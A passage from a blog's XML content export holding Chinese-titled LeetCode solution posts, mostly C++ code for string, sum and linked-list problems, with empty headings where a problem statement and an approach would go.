<span class="keyword">while</span>(k &gt; head &amp;&amp; sortedNum[k] == sortedNum[tail])k--;</span><br><span class="line">                    tail = k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>14. 最长公共前缀</title>
    <url>/2018/09/10/LeetCode/leetcode-000014.%20%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestCommonPrefix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;strs)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result;</span><br><span class="line">        <span class="keyword">int</span> len = strs.size();</span><br><span class="line">        <span class="keyword">int</span> i,j;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">0</span>)<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;; ++j) &#123;</span><br><span class="line">           <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            	<span class="keyword">if</span>(j &gt;= strs[i].length() || strs[i][j] != strs[<span class="number">0</span>][j]) &#123;</span><br><span class="line">                	<span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(i&lt;len) &#123;</span><br><span class="line">        	    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result += strs[<span class="number">0</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>16. 最接近的三数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000016.%20%E6%9C%80%E6%8E%A5%E8%BF%91%E7%9A%84%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">twoSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> start, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        <span class="keyword">int</span> head = start;</span><br><span class="line">        <span class="keyword">int</span> end = num.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> dis = INT_MAX;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(head &lt; end) &#123;</span><br><span class="line">            <span class="keyword">int</span> tem = num[head] + num[end];</span><br><span class="line">            <span class="keyword">if</span>(tem &lt; target) &#123;</span><br><span class="line">                <span class="keyword">if</span>(target - tem &lt; dis) &#123;</span><br><span class="line">                    dis = target - tem;</span><br><span class="line">                    result = tem;</span><br><span class="line">                &#125;</span><br><span class="line">                head ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(tem &gt; target) &#123;</span><br><span class="line">                <span class="keyword">if</span>(tem - target &lt; dis) &#123;</span><br><span class="line">                    dis = tem - target;</span><br><span class="line">                    result = tem;</span><br><span class="line">                &#125;</span><br><span class="line">                end --;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> target;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        <span class="keyword">int</span> dis = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> size = num.size() - <span class="number">2</span>;</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; size;i ++) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = target - num[i];</span><br><span class="line">            <span class="keyword">int</span> temDis;</span><br><span class="line">            <span class="keyword">int</span> temResult = twoSumClosest(num, i + <span class="number">1</span>, temp);</span><br><span class="line">            temDis = <span class="built_in">abs</span>(temResult - temp);</span><br><span class="line">            <span class="keyword">if</span>(temDis &lt; dis) &#123;</span><br><span class="line">                result = temResult + num[i];</span><br><span class="line">                dis = temDis;</span><br><span class="line">                <span class="keyword">if</span>(result == target) &#123;</span><br><span class="line">                    <span class="keyword">return</span> target;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>17. 电话号码的字母组合</title>
    <url>/2018/09/10/LeetCode/leetcode-000017.%20%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E7%9A%84%E5%AD%97%E6%AF%8D%E7%BB%84%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">letterCombinations</span><span class="params">(<span class="built_in">string</span> digits)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">res</span><span class="params">(<span class="number">1</span>,<span class="string">""</span>)</span></span>;</span><br><span class="line">        <span class="built_in">string</span> numap[] = &#123;<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"abc"</span>,<span class="string">"def"</span>,<span class="string">"ghi"</span>,<span class="string">"jkl"</span>,<span class="string">"mno"</span>,<span class="string">"pqrs"</span>,<span class="string">"tuv"</span>,<span class="string">"wxyz"</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digits.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;tmp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res.size(); j++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; numap[digits[i] - <span class="string">'0'</span>].size(); k++)</span><br><span class="line">                    tmp.push_back(res[j] + numap[digits[i] - <span class="string">'0'</span>][k]);</span><br><span class="line">            res = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>18. 四数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000018.%20%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">fourSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = num.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &gt; &gt;pairs;</span><br><span class="line">        pairs.reserve(n*n);</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span> ; j &lt; n; j++)</span><br><span class="line">                pairs[num[i]+num[j]].push_back(make_pair(i,j));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; num[i] == num[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; n - <span class="number">2</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j != i+<span class="number">1</span> &amp;&amp; num[j] == num[j<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(pairs.find(target - num[i] - num[j]) != pairs.end())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; &amp;sum2 = pairs[target - num[i] - num[j]];</span><br><span class="line">                    <span class="keyword">bool</span> isFirstPush = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; sum2.size(); k++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(sum2[k].first &lt;= j)<span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">if</span>(isFirstPush || (res.back())[<span class="number">2</span>] != num[sum2[k].first])</span><br><span class="line">                        &#123;</span><br><span class="line">                            res.push_back(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;num[i], num[j], num[sum2[k].first], num[sum2[k].second]&#125;);</span><br><span class="line">                            isFirstPush = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>19. 删除链表的倒数第N个节点</title>
    <url>/2018/09/10/LeetCode/leetcode-000019.%20%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACN%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">removeNthFromEnd</span><span class="params">(ListNode *head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       ListNode *pPre = <span class="literal">NULL</span>;</span><br><span class="line">       ListNode *p = head;</span><br><span class="line">       ListNode *q = head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">           q = q-&gt;next;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">while</span>(q-&gt;next) &#123;</span><br><span class="line">           pPre = p;</span><br><span class="line">           p = p-&gt;next;</span><br><span class="line">           q = q-&gt;next;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (pPre == <span class="literal">NULL</span>) &#123;</span><br><span class="line">           head = p-&gt;next;</span><br><span class="line">           <span class="keyword">delete</span> p;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           pPre-&gt;next = p-&gt;next;</span><br><span class="line">           <span class="keyword">delete</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">          </span><br><span class="line">       <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>21. 合并两个有序链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000021.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeTwoLists</span><span class="params">(ListNode *l1, ListNode *l2)</span> </span>&#123;</span><br><span class="line">        ListNode *root,*p;</span><br><span class="line">        root=<span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        p=root;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1==<span class="literal">NULL</span>)&#123;p-&gt;next=l2;<span class="keyword">break</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span>(l2==<span class="literal">NULL</span>)&#123;p-&gt;next=l1;<span class="keyword">break</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val&lt;l2-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;next=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;next=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *temp=root-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span>(root);</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//http://blog.csdn.net/havenoidea</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>22. 括号生成</title>
    <url>/2018/09/10/LeetCode/leetcode-000022.%20%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, <span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; &amp;result)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="number">0</span> &amp;&amp; right == <span class="number">0</span>)&#123;</span><br><span class="line">            result.push_back(s);</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            generate(left - <span class="number">1</span>, right, s + <span class="string">'('</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(right &gt; <span class="number">0</span> &amp;&amp; left &lt; right) &#123;</span><br><span class="line">            generate(left, right - <span class="number">1</span>, s + <span class="string">')'</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        </span><br><span class="line">        generate(n, n, s, result);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>23. 合并K个排序链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000023.%20%E5%90%88%E5%B9%B6K%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span> <span class="params">()</span><span class="params">(<span class="keyword">const</span> ListNode *a, <span class="keyword">const</span> ListNode *b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-&gt;val &gt; b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeKLists</span><span class="params">(<span class="built_in">vector</span>&lt;ListNode *&gt; &amp;lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = lists.size();</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode node(0), *res = &amp;node;</span><br><span class="line">        priority_queue&lt;ListNode*, <span class="built_in">vector</span>&lt;ListNode*&gt;, cmp&gt; que;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">if</span>(lists[i])</span><br><span class="line">                que.push(lists[i]);</span><br><span class="line">        <span class="keyword">while</span>(!que.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode * p = que.top();</span><br><span class="line">            que.pop();</span><br><span class="line">            res-&gt;next = p;</span><br><span class="line">            res = p;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next)</span><br><span class="line">                que.push(p-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>25. k个一组翻转链表</title>
    <url>/2018/09/10/LeetCode/leetcode-000025.%20k%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ListNode <span class="title">reverse</span><span class="params">(ListNode pre, ListNode next)</span></span>&#123;</span><br><span class="line">        ListNode last = pre.next;</span><br><span class="line">        ListNode cur = last.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != next)&#123;</span><br><span class="line">            last.next = cur.next;</span><br><span class="line">            cur.next = pre.next;</span><br><span class="line">            pre.next = cur;</span><br><span class="line">            cur = last.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == null || k == <span class="number">1</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        ListNode pre = dummy;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != null)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span>(i % k ==<span class="number">0</span>)&#123;</span><br><span class="line">                pre = reverse(pre, head.next);</span><br><span class="line">                head = pre.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                head = head.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>24. 两两交换链表中的节点</title>
    <url>/2018/09/10/LeetCode/leetcode-000024.%20%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">swapPairs</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(head -&gt; next == <span class="literal">NULL</span>) <span class="keyword">return</span> head;</span><br><span class="line">        </span><br><span class="line">        ListNode *first = head;</span><br><span class="line">        ListNode *second = head -&gt; next;</span><br><span class="line">        ListNode *third = second -&gt; next;</span><br><span class="line">        </span><br><span class="line">        second -&gt; next = first;</span><br><span class="line">        first -&gt; next = swapPairs(third);</span><br><span class="line">        <span class="keyword">return</span> second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
